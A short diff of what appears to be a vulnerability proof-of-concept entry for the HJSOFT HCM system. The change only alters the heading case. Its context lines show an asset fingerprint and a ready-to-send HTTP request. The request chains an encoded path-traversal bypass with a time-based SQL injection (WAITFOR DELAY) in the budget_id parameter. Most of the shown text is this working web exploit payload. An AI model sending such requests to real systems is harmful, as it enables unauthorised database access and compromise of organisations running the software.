@@ -8,7 +8,7 @@
 app="HJSOFT-HCM"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&flag=1 HTTP/1.1
